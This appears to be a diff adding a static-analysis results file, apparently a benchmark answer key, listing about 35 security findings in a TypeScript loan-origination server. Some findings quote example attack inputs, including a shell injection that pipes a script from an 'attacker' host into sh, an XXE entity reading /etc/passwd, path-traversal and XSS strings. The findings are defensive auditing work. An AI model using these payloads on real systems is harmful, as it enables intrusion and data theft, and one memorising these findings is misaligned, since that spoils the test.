@@ -1,0 +1,895 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.authentication.account-enumeration",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 486,
+        "col": 3,
+        "offset": 17292
+      },
+      "end": {
+        "line": 486,
+        "col": 34,
+        "offset": 17323
+      },
+      "extra": {
+        "message": "POST /api/auth/access-recovery (initiateAccessRecovery) responds with { matched: true/false }, revealing whether the supplied ownerName and taxIdentifierLast4 match the borrower profile, and this route has no rate limiter (unlike /auth/verification/start at line 521 which is wrapped in accountVerificationLimiter). An attacker can submit unlimited guesses to confirm owner names and SSN last-4 digits for a known email, enabling account enumeration and brute force of the recovery factors that trigger a password-reset token.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts",
+            "CWE-204: Observable Response Discrepancy"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authentication.verification-token-bypass",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 536,
+        "col": 3,
+        "offset": 19076
+      },
+      "end": {
+        "line": 536,
+        "col": 97,
+        "offset": 19170
+      },
+      "extra": {
+        "message": "In completeAccountVerification (POST /api/auth/verification/complete), the token from the request body is validated only for length (z.string().min(20)) and is never compared against the account's stored resetTokenHash/resetTokenExpiresAt. The handler looks the account up solely by email and immediately issues a signed lop_session cookie (res.cookie at line 536). Anyone who knows a victim's email can log in as that user (including admins) by submitting any 20+ character string as the token.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.missing-authentication",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 598,
+        "col": 1,
+        "offset": 21076
+      },
+      "end": {
+        "line": 598,
+        "col": 60,
+        "offset": 21135
+      },
+      "extra": {
+        "message": "GET /api/cases/:externalId/timeline is registered at line 598, before router.use(requireAuth) at line 626, so it is reachable without any authentication. The handler getCaseTimeline (lines 572-596) returns application status, decision reasons, assignee name, and full internal underwriting notes for any externalId, leaking internal-only data to anonymous callers.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-filter-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 676,
+        "col": 18,
+        "offset": 24057
+      },
+      "end": {
+        "line": 676,
+        "col": 63,
+        "offset": 24102
+      },
+      "extra": {
+        "message": "searchStaffDirectory interpolates the raw q query parameter into the LDAP filter `(&(department=underwriting)(cn=*${term}*))` without calling escapeDirectoryFilterValue. The directory client's filter compiler (server/src/utils/directoryClient.ts) treats unbalanced parentheses as a widened predicate and fails open to a match-all predicate on parse errors. Input such as *))(|(cn=* escapes the department=underwriting restriction and enumerates directory entries outside the intended scope (support and service-account records with group memberships).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.missing-authorization",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1134,
+        "col": 3,
+        "offset": 44742
+      },
+      "end": {
+        "line": 1134,
+        "col": 43,
+        "offset": 44782
+      },
+      "extra": {
+        "message": "handoffApplication (POST /api/applications/:id/handoff) loads the application with loadApplication but never calls assertCanView or checks the caller's role; the only authorization check is `body.accountType !== \"originator\"`, which validates a client-supplied request field rather than the caller's privileges. Any authenticated borrower can reassign any application to any underwriter by sending accountType \"originator\". The sibling co-review endpoint (line 1150) correctly requires isStaffRole.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.http-header-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1319,
+        "col": 3,
+        "offset": 53752
+      },
+      "end": {
+        "line": 1319,
+        "col": 80,
+        "offset": 53829
+      },
+      "extra": {
+        "message": "getApplicationStatementExport places the export_name query parameter directly into the Content-Disposition header (`attachment; filename=\"${exportName}\"`) without stripping CR/LF or quote characters. The parallel statement-preview handler (lines 1325-1332) sanitizes exportName with .replace(/[\\r\\n]/g, \"\"), confirming the value is attacker-controlled. A crafted export_name containing \\r\\n enables HTTP response splitting / header injection (or header rejection causing denial of service).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: HTTP Response Splitting",
+            "CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.os-command-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1347,
+        "col": 5,
+        "offset": 55487
+      },
+      "end": {
+        "line": 1347,
+        "col": 121,
+        "offset": 55603
+      },
+      "extra": {
+        "message": "generateApplicationDossierExport passes the entire command line as a single string to spawn with { shell: true }: spawn(`scripts/render-dossier.sh ${application.externalId} ${format} ${outputPath}`, { shell: true }). The format value comes straight from the format query parameter (line 1344) and is not validated against an allowlist, unlike the partner variant (lines 1357-1368) which restricts format to pdf/docx/html and uses shell: false with an argument array. A format value such as `; curl http://attacker/x.sh | sh #` executes arbitrary shell commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.files.path-traversal",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1380,
+        "col": 3,
+        "offset": 57508
+      },
+      "end": {
+        "line": 1380,
+        "col": 74,
+        "offset": 57579
+      },
+      "extra": {
+        "message": "getChecklistTemplate builds the template path as path.join(CHECKLIST_TEMPLATE_DIR, `${locale}.md`) where locale is the raw x-checklist-locale request header (line 1379), then reads it with fs.readFile. No basename/normalization is applied (the exhibit-template handler at lines 1387-1396 correctly applies path.basename). A header value containing ../ sequences lets the caller read arbitrary .md files outside the template directory on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.files.path-traversal-write",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1406,
+        "col": 3,
+        "offset": 58801
+      },
+      "end": {
+        "line": 1406,
+        "col": 69,
+        "offset": 58867
+      },
+      "extra": {
+        "message": "syncWorkingPaperDraft uses the lop_workspace_alias cookie (line 1405) directly in path.join(WORKING_PAPER_DIR, workspaceAlias), then creates that directory and writes `${application.id}.md` into it with attacker-controlled content (up to 20000 characters). The cookie is fully client-controlled and no path.basename() is applied, unlike the checklist-draft handler (lines 1414-1425). An alias such as ../../../../tmp/evil writes files to arbitrary directories on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.cleartext-storage-sensitive-data",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1490,
+        "col": 5,
+        "offset": 62631
+      },
+      "end": {
+        "line": 1496,
+        "col": 7,
+        "offset": 62889
+      },
+      "extra": {
+        "message": "recordPayoutInstruction saves the borrower's bank accountNumber and routingNumber as cleartext columns on BorrowerPayoutAccount (entity columns at server/src/entities/BorrowerPayoutAccount.ts lines 19-23). The partner variant (recordPartnerPayoutInstruction, lines 1507-1539) encrypts the same fields with encryptPayoutDetails (AES-256-GCM). Storing bank account details unencrypted exposes them to anyone with database or backup access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logging.sensitive-data-in-log",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1498,
+        "col": 5,
+        "offset": 62916
+      },
+      "end": {
+        "line": 1498,
+        "col": 146,
+        "offset": 63057
+      },
+      "extra": {
+        "message": "When saving a borrower payout instruction fails, the handler logs the entire request body via activityLog.error(`... ${JSON.stringify(body)} ...`), which includes the full bank accountNumber and routingNumber in plaintext. The partner variant (line 1534) deliberately logs only the error message. This writes sensitive financial data into application logs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfiguration.cors-origin-reflection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1550,
+        "col": 5,
+        "offset": 65148
+      },
+      "end": {
+        "line": 1550,
+        "col": 77,
+        "offset": 65220
+      },
+      "extra": {
+        "message": "getPartnerStatementWidget reflects the request Origin header (or falls back to \"*\") into Access-Control-Allow-Origin whenever any x-partner-key header is present; the key value is never validated against a secret. The same branch removes X-Frame-Options (line 1549), enabling clickjacking and cross-origin embedding of this endpoint by arbitrary sites.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.cookie-value-in-script",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1580,
+        "col": 3,
+        "offset": 66543
+      },
+      "end": {
+        "line": 1580,
+        "col": 128,
+        "offset": 66668
+      },
+      "extra": {
+        "message": "getWorkspaceThemeWidget interpolates the lop_theme_pref cookie value into a <script> block: `<script>var workspaceTheme = \"${themePref}\"; ...` without calling htmlEscape, unlike the layout widget (lines 1585-1591) which escapes its equivalent cookie with htmlEscape. A cookie value such as `\"; alert(document.cookie); \"` (settable via any script or subdomain on the origin) executes arbitrary JavaScript when the widget is rendered, resulting in cross-site scripting.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-randomness",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1623,
+        "col": 3,
+        "offset": 68689
+      },
+      "end": {
+        "line": 1623,
+        "col": 51,
+        "offset": 68737
+      },
+      "extra": {
+        "message": "issueBranchTransferCode generates the 6-digit branch transfer confirmation code with Math.floor(Math.random() * 1000000). Math.random() is not cryptographically secure and its output is predictable. The sibling payment-account handler (line 1735) correctly uses crypto.randomInt(0, 1000000). Predictable confirmation codes allow an attacker who can infer the PRNG state to guess the code and confirm branch transfers.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.idor",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1654,
+        "col": 3,
+        "offset": 69915
+      },
+      "end": {
+        "line": 1661,
+        "col": 4,
+        "offset": 70177
+      },
+      "extra": {
+        "message": "getUnderwritingNoteDetail (GET /api/notes/:id) loads any UnderwritingNote by id and returns its body, severity, and author name with no role or ownership check \u2014 there is no isStaffRole check and no assertCanView on the note's application. Any authenticated borrower can enumerate note ids and read internal underwriting notes that serializeApplication otherwise hides from non-staff users. The note search endpoint (line 1675) correctly requires isStaffRole.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.sql-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1681,
+        "col": 5,
+        "offset": 70867
+      },
+      "end": {
+        "line": 1681,
+        "col": 173,
+        "offset": 71035
+      },
+      "extra": {
+        "message": "searchUnderwritingNotesByFilter interpolates the severity and keyword query parameters directly into a raw SQL string executed via AppDataSource.query: `SELECT id, application_id, severity, created_at FROM underwriting_notes WHERE severity = '${severity}' AND body ILIKE '%${keyword}%' ORDER BY created_at DESC LIMIT 50`. Both values come from req.query without sanitization, allowing SQL injection (e.g. a single quote in keyword breaks out of the ILIKE literal, enabling UNION or stacked queries). The sibling messages search (lines 1693-1696) uses parameterized $1/$2 placeholders.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.disclosure.stack-trace",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2417,
+        "col": 5,
+        "offset": 102310
+      },
+      "end": {
+        "line": 2417,
+        "col": 94,
+        "offset": 102399
+      },
+      "extra": {
+        "message": "generatePortfolioRiskSummary returns the raw error message and stack trace to the client in the 500 response: res.status(500).json({ error: (error as Error).message, stack: (error as Error).stack }). Stack traces disclose internal file paths, library details, and query structure. The sibling compliance summary handler (lines 2430-2434) correctly logs server-side and returns only a generic message with an error id.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.log-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2442,
+        "col": 3,
+        "offset": 103463
+      },
+      "end": {
+        "line": 2442,
+        "col": 78,
+        "offset": 103538
+      },
+      "extra": {
+        "message": "recordPortfolioSearchActivity writes the raw query parameter into the activity log via activityLog.info(`user ${user.id} searched portfolio for: ${searchQuery}`) without stripping CR/LF characters. The sibling document-search handler (lines 2448-2454) strips [\\r\\n\\0] before logging. An attacker can forge or corrupt log entries by embedding newlines and fake log lines in the query parameter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.xpath-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2496,
+        "col": 3,
+        "offset": 105989
+      },
+      "end": {
+        "line": 2496,
+        "col": 63,
+        "offset": 106049
+      },
+      "extra": {
+        "message": "findKybDocumentsByLabel interpolates the label query parameter into the XPath expression `//document[@label='${label}']` passed to RecordIndex.find without escaping. A label containing a single quote (e.g. `' or @category='bank`) breaks out of the string literal and alters the predicate (XPath injection). The sibling category search (line 2514) correctly wraps the value with escapeXPathString.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.unbounded-loop",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2530,
+        "col": 5,
+        "offset": 107644
+      },
+      "end": {
+        "line": 2530,
+        "col": 54,
+        "offset": 107693
+      },
+      "extra": {
+        "message": "generateApplicationAmortizationForecast accepts the periods query parameter without any upper bound and runs `for (let period = 1; period <= periods; period++)`, pushing an entry into the schedule array on each iteration. A value such as periods=1e9 causes long-running CPU occupation and unbounded memory growth (denial of service). The sibling amortization-schedule handler (lines 2544-2551) clamps periods to MAX_AMORTIZATION_PERIODS (480).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption",
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfiguration.cors-credentials-reflection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2632,
+        "col": 5,
+        "offset": 112700
+      },
+      "end": {
+        "line": 2633,
+        "col": 59,
+        "offset": 112812
+      },
+      "extra": {
+        "message": "getPartnerIntegrationHealthWidget reflects the request Origin header into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true for any origin. This allows any malicious site to make credentialed cross-origin requests to this authenticated staff endpoint and read the responses, defeating the same-origin protection of the session cookie. The sibling status-feed handler (lines 2647-2650) correctly validates the origin against the PARTNER_PORTAL_ORIGINS allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-password-hash",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2714,
+        "col": 3,
+        "offset": 116557
+      },
+      "end": {
+        "line": 2714,
+        "col": 90,
+        "offset": 116644
+      },
+      "extra": {
+        "message": "provisionPartnerPortalAccount hashes the password with a single unsalted SHA-256 digest: crypto.createHash(\"sha256\").update(body.password).digest(\"hex\"). Fast, unsalted hashing makes offline cracking and rainbow-table attacks on leaked password hashes trivial. Every other account-creation path uses hashPassword (bcrypt, cost 12), e.g. provisionBranchStaffAccount at line 2745.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort",
+            "CWE-759: Use of a One-Way Hash without a Salt"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.jwt.algorithm-none-allowed",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2755,
+        "col": 3,
+        "offset": 118246
+      },
+      "end": {
+        "line": 2755,
+        "col": 95,
+        "offset": 118338
+      },
+      "extra": {
+        "message": "acknowledgePartnerDeliveryReceipt verifies the x-partner-delivery-receipt JWT with { algorithms: [\"HS256\", \"none\"] }, explicitly allowing the \"none\" (unsigned) algorithm in the verification allowlist. Tokens carrying alg=none have no signature, so an attacker can craft a receipt with arbitrary claims (integrationId, externalId, status) that the endpoint accepts, forging partner delivery acknowledgements. The confirmed sibling endpoint (line 2783) restricts algorithms to [\"HS256\"] and wraps verification in error handling.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.mass-assignment.cookie-to-entity",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2861,
+        "col": 5,
+        "offset": 123276
+      },
+      "end": {
+        "line": 2861,
+        "col": 33,
+        "offset": 123304
+      },
+      "extra": {
+        "message": "restoreReviewerQueuePreferences does Object.assign(user, parsed) where parsed is JSON.parse of the client-controlled rq_prefs cookie, then saves the user entity to the database. There is no schema or field validation (the borrower variant at lines 2876-2884 validates with a zod schema). A staff user can overwrite any column on their own account \u2014 including role and passwordHash \u2014 escalating their privileges to admin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.cookie-without-httponly",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2956,
+        "col": 3,
+        "offset": 127507
+      },
+      "end": {
+        "line": 2956,
+        "col": 93,
+        "offset": 127597
+      },
+      "extra": {
+        "message": "syncMobileCompanionSession sets the lop_companion_session cookie containing a full signed session token with only { maxAge: 30 days } \u2014 no httpOnly, no secure, and no sameSite attributes. Any script running on the origin (e.g. via XSS) can read this cookie and hijack the 30-day session. The desktop variant (lines 2972-2977) correctly sets httpOnly, secure, and sameSite strict.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.mass-assignment.unvalidated-body",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3117,
+        "col": 3,
+        "offset": 134891
+      },
+      "end": {
+        "line": 3117,
+        "col": 40,
+        "offset": 134928
+      },
+      "extra": {
+        "message": "applyIntakeFormUpdate (PATCH /api/applications/:id/intake-form) performs Object.assign(application, req.body) with completely unvalidated body fields and saves the entity. Attackers can overwrite arbitrary columns such as status, riskTier, decidedAt, externalId, and amount \u2014 e.g. a borrower can flip their own draft directly to \"approved\", bypassing the workflow enforced by /transition and /decisions. The sibling intake-form-fields handler (lines 3132-3145) validates with a strict zod schema.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.padding-oracle",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3161,
+        "col": 5,
+        "offset": 136598
+      },
+      "end": {
+        "line": 3164,
+        "col": 93,
+        "offset": 136906
+      },
+      "extra": {
+        "message": "advanceIntakeWizardStep returns distinct error responses for draft-state decryption failures: message.includes(\"bad decrypt\") || message.includes(\"wrong final block length\") produces draft_padding_invalid, while other failures produce draft_decrypt_failed. The draft state is AES-256-CBC encrypted with no authentication tag (server/src/utils/draftStateCipher.ts), so exposing whether the padding was valid creates a padding oracle that lets an attacker submit modified ciphertexts and progressively decrypt or forge draft blobs. The worksheet variant (lines 3172-3189) collapses all failures into one generic error and uses authenticated AES-GCM.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.redirect.open-redirect",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3242,
+        "col": 3,
+        "offset": 140366
+      },
+      "end": {
+        "line": 3242,
+        "col": 25,
+        "offset": 140388
+      },
+      "extra": {
+        "message": "completeDocumentUploadFlow redirects to nextUrl taken from the x-redirect-url header or the returnTo body field without any validation: res.redirect(nextUrl). An absolute URL such as https://phishing.example is passed straight to the redirect, enabling open redirect and phishing. The sibling esignature-flow handler (lines 3249-3269) validates destinations against an allowlist and same-origin URL checks.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.upload.unrestricted-file-type",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3277,
+        "col": 1,
+        "offset": 141866
+      },
+      "end": {
+        "line": 3277,
+        "col": 114,
+        "offset": 141979
+      },
+      "extra": {
+        "message": "The marketing asset upload multer instance (marketingAssetUpload) accepts files of any MIME type \u2014 it defines no fileFilter, unlike productThumbnailUpload (lines 3298-3305) which restricts uploads to image/png and image/jpeg. Per the comment, these assets are displayed directly on the public marketing site, so a staff user can upload HTML/SVG/JavaScript content, achieving stored XSS or content spoofing on the public site.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.files.path-traversal-write",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3286,
+        "col": 3,
+        "offset": 142508
+      },
+      "end": {
+        "line": 3287,
+        "col": 47,
+        "offset": 142640
+      },
+      "extra": {
+        "message": "publishBranchMarketingAsset builds the destination as path.join(marketingAssetsDir, `${slot}-${req.file.originalname}`) and writes it with writeFileSync. Both slot (a multipart body field) and the uploaded original filename are client-controlled and unsanitized \u2014 no path.basename or safeFilename is applied \u2014 so values containing ../ sequences write arbitrary files anywhere on the server filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.code-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3371,
+        "col": 3,
+        "offset": 146757
+      },
+      "end": {
+        "line": 3371,
+        "col": 92,
+        "offset": 146846
+      },
+      "extra": {
+        "message": "previewCustomPricingFormula evaluates the attacker-supplied formula query parameter as code: new Function(\"context\", `with (context) { return (${userFormula}); }`) followed by evaluator(context). Arbitrary JavaScript executes on the server (e.g. using dynamic import(\"node:child_process\") to run OS commands), limited only to underwriter/admin callers. The sibling pricing-scenario endpoint (lines 3385-3403) safely selects from predefined scenario functions.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf.unvalidated-url-fetch",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3415,
+        "col": 3,
+        "offset": 149207
+      },
+      "end": {
+        "line": 3415,
+        "col": 45,
+        "offset": 149249
+      },
+      "extra": {
+        "message": "ingestPartnerCollateralDocument fetches the URL from the x-partner-document-url request header without any validation: await fetch(documentUrl). An attacker (any staff user) can point this at internal network addresses (e.g. cloud metadata endpoints or internal services), making the server perform arbitrary requests (SSRF) and reporting response status and byte length back. The sibling compliance-bulletin handler (lines 3430-3445) validates the host against an allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.type-confusion.truthy-string-check",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3479,
+        "col": 3,
+        "offset": 152469
+      },
+      "end": {
+        "line": 3479,
+        "col": 23,
+        "offset": 152489
+      },
+      "extra": {
+        "message": "resolvePartnerIntegrationAccess decides elevated access with `if (result.access)` where queryPartnerAccessLedger returns access as the string \"false\" for even branch ids (the comment notes the partner ledger returns a stringified boolean). In JavaScript the non-empty string \"false\" is truthy, so branches whose ledger access is \"false\" are incorrectly granted elevated: true. The sibling compliance handler (line 3497) correctly compares result.access === true.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-480: Use of Incorrect Operator"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xxe.xml-external-entity",
+      "path": "server/src/utils/workspaceEnvelope.ts",
+      "start": {
+        "line": 22,
+        "col": 7,
+        "offset": 936
+      },
+      "end": {
+        "line": 22,
+        "col": 116,
+        "offset": 1045
+      },
+      "extra": {
+        "message": "expandEntities resolves SYSTEM entities declared in the workspace envelope XML and reads local files whenever the value starts with file://: fs.readFileSync(value.replace(\"file://\", \"\")). The envelope is attacker-controlled \u2014 GET /api/applications/:id/workspace-envelope (server/src/routes/api.ts lines 1600-1601) decodes the lop_workspace_envelope cookie and passes it to parseWorkspaceEnvelope. A crafted cookie declaring <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> and referencing &xxe; inside <activeTab> returns the file's contents in the JSON response (XXE arbitrary file read). The trusted variant (lines 42-50) rejects DOCTYPE declarations.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference",
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.hardcoded-default-secret",
+      "path": "server/src/config.ts",
+      "start": {
+        "line": 10,
+        "col": 3,
+        "offset": 422
+      },
+      "end": {
+        "line": 10,
+        "col": 85,
+        "offset": 504
+      },
+      "extra": {
+        "message": "jwtSecret falls back to the hardcoded string \"dev-only-change-me-loan-origination-portal\" when the JWT_SECRET environment variable is unset. This secret signs all session tokens (signSession) as well as the support-impersonation and partner-review JWTs. If the application is deployed without setting JWT_SECRET, any attacker who knows the public default value can forge valid session cookies for arbitrary users, including admins.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
